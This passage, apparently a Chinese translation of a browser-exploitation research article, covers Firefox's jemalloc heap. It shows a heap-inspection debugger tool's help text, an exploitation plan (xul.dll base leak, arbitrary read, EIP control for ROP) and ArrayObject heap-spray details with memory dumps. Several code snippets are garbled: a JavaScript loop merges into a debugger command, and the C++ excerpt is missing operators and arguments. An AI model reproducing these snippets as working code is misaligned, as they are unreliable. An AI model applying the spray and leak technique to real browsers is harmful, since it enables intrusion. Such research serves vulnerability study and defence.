        my_canvas.width = "100";
        my_canvas.height = "115";
        document.body.appendChild(my_canvas);
        for(var i = 0; i  !py c:\\tmp\\shadow\\pykd_driver help
        [shadow] De Mysteriis Dom Firefox
        [shadow] v1.0b
        [shadow] jemalloc-specific commands:
        [shadow]   jechunks                : dump info on all available chunks
        [shadow]   jearenas                : dump info on jemalloc arenas
        [shadow]   jerun          : dump info on a single run
        [shadow]   jeruns [-cs]            : dump info on jemalloc runs
        [shadow]                                 -c: current runs only
        [shadow]                    -s : runs for the given size
        [shadow]                                    class only
        [shadow]   jebins                  : dump info on jemalloc bins
        [shadow]   jeregions   : dump all current regions of the
        [shadow]                                    given size class
        [shadow]   jesearch [-cfqs]   : search the heap for the given hex
        [shadow]                                    dword
        [shadow]                                 -c: current runs only
        [shadow]                                 -q: quick search (less
        [shadow]                                    details)
        [shadow]                    -s : regions of the given size
        [shadow]                                    only
        [shadow]                                 -f: search for filled region
        [shadow]                                    holes)
        [shadow]   jeinfo         : display all available details for
        [shadow]                                    an address
        [shadow]   jedump [filename]       : dump all available jemalloc info
        [shadow]                                    to screen (default) or file
        [shadow]   jeparse                 : parse jemalloc structures from
        [shadow]                                    memory
        [shadow] Firefox-specific commands:
        [shadow]   nursery                 : display info on the SpiderMonkey
        [shadow]                                    GC nursery
        [shadow]   symbol [-vjdx]    : display all Firefox symbols of the
        [shadow]                                    given size
        [shadow]                                 -v: only class symbols with
        [shadow]                                    vtable
        [shadow]                                 -j: only symbols from
        [shadow]                                    SpiderMonkey
        [shadow]                                 -d: only DOM symbols
        [shadow]                                 -x: only non-SpiderMonkey
        [shadow]                                    symbols
        [shadow]   pa  [] : modify the ArrayObject's length
        [shadow]                                    (default new length 0x666)
        [shadow] Generic commands:
        [shadow]   version                 : output version number
        [shadow]   help                    : this help message
您可以在本文附带的代码存档中以及GitHub [SHD]上找到最新版本的shadow以及安装说明。 另外:
我只有时间在Windows和WinDBG上测试所有内容。 Linux / GDB上的支持几乎完成（虽然不支持symbol命令）。 但还没有做过支持OS X
/ LLDB的工作。
# 5.Exploitation
在介绍中，我将本文的目标定为一种通用的，可重用的开发方法，可以应用于尽可能多的Firefox错误（和bug类）。
更具体地说，这个高级目标可以分解为以下几点：
  1. xul.dll的基地址泄漏。 这个DLL是Firefox的主要版本，它包含SpiderMonkey和Gecko（Firefox的布局引擎）的代码。 这个巨大的DLL包含您可能想要的所有ROP小工具。笔者在分析的时候，下载下来的xul.dll的Pdb文件有641 mb。
  2. Firefox堆中的地址泄漏，利用我们的bug，就可以控制它们。 这非常有用，因为我们可以使用它来创建具有指向我们控制的数据的有效地址的虚假对象。
  3. 能够从我们选择的任何地址读取任意数量的字节，即任意地址泄漏。
  4. 最后，EIP控制（例如，启动ROP链）。
为了实现这些，我们将使用标准JavaScript数组，即ArrayObject jsobjects作为基本元素。 过去，研究人员已将 typed
arrays 用于类似目的[P2O，REN]。
但是，正如我们在2.1节中看到的那样，类型化数组的用户可控内容（数据）及其元数据（如它们的长度和数据指针）在内存中不再是连续的。
另一方面，我发现可以强制ArrayObjects将其元数据放在jemalloc堆上的数据旁边，并具有以下有用的特性：
  1. 我们可以将它们的大小控制为8个字节的倍数，并且还可以部分控制它们的内容，这都归功于我们所看到的IEEE-754 64位jsval表示。
  2. 我们可以轻松地从JavaScript中使用ArrayObjects进行可控制的堆喷。
  3. 我们可以在填充nursery后将喷射的ArrayObjects移动到jemalloc管理的堆中。 由于数组是jsobjects，当它们变大时，它们的行为方式与2.3节中描述的方式相同。
## 5.1 - 数组对象中的对象
我们将ArrayObjects作为container，再把 ArrayObject作为元素进行堆喷;
当container变得足够大时，元素（它们本身是ArrayObjects）被移动到jemalloc堆并包含它们的内容和metadata。 在js /
src / gc / Marking.cpp中我们可以在方法js :: TenuringTracer ::
moveElementsToTenured（）中看到这一点 -请注意注释带有注释伪代码，请参阅完整详细信息的实际来源：
    /*
     * nslots here is equal to the capacity of the ArrayObject plus 2
     * (ObjectElements::VALUES_PER_HEADER).
     */
    size_t nslots = ObjectElements::VALUES_PER_HEADER + srcHeader->capacity;
    ...
    if (src->is() && nslots (zone->pod_malloc(nslots));
    js_memcpy(dstHeader, srcHeader, nslots * sizeof(HeapSlot));
    nursery().setElementsForwardingPointer(srcHeader, dstHeader, nslots);
让我们重新讨论2.3节中的示例，并将ArrayObjects及其元数据移动到jemalloc堆的上下文中。
上图描述了当我们运行以下JavaScript代码时Firefox堆会发生什么。 我们创建一个container ArrayObject;
这最初分配在nursery。
var container = new Array();
当我们向container 添加 ArrayObjects时，会发生 a minor (nursery) garbage collection。
我们通过填充16 MB的 nursery 来触发这个，共36个元素，每个元素又包含66000 ArrayObject -记住每个元素是8个字节（jsval），但是最终的大小为240的ArrayObject会分配到256 大小的jemalloc run
中（当然包括metadata）。
// 16777216 / 256 == 65536  
var spray_size = 66000;
container ArrayObject（A）从nursery 移动到tenured heap。 如果（2 + capacity）> =
17，则在jemalloc堆上重新为container的每个ArrayObject元素分配空间。
由于这些是ArrayObjects，因此它们具有数据和metadata。 容器在其剩余的生命周期内保留在tenured堆上。
    for(var i = 0; i  !py c:\\tmp\\pykd_driver jesearch -s 256 -c 45464645
        [shadow] searching all current runs of size class 256 for 45464645
        [shadow] found 45464645 at 0x141ad110
                        (run 0x141ad000, region 0x141ad100, region size 0256)
        [shadow] found 45464645 at 0x141ad120
                        (run 0x141ad000, region 0x141ad100, region size 0256)
        [shadow] found 45464645 at 0x141ad130
                        (run 0x141ad000, region 0x141ad100, region size 0256)
        0:000> dd 141ad100 l?80
        [ Metadata of a sprayed ArrayObject ]
                  flags    initlen  capacity length
        141ad100  00000000 0000001e 0000001e 0000001e
        [ Contents of the same sprayed ArrayObject ]
        141ad110  45464645 ffffff81 47484847 ffffff81
        141ad120  45464645 ffffff81 47484847 ffffff81
        ...
        141ad1e0  45464645 ffffff81 47484847 ffffff81
        141ad1f0  45464645 ffffff81 47484847 ffffff81
        [ Metadata of another sprayed ArrayObject]
                  flags    initlen  capacity length
        141ad200  00000000 0000001e 0000001e 0000001e
        [ and its data ]
        141ad210  45464645 ffffff81 47484847 ffffff81
        141ad220  45464645 ffffff81 47484847 ffffff81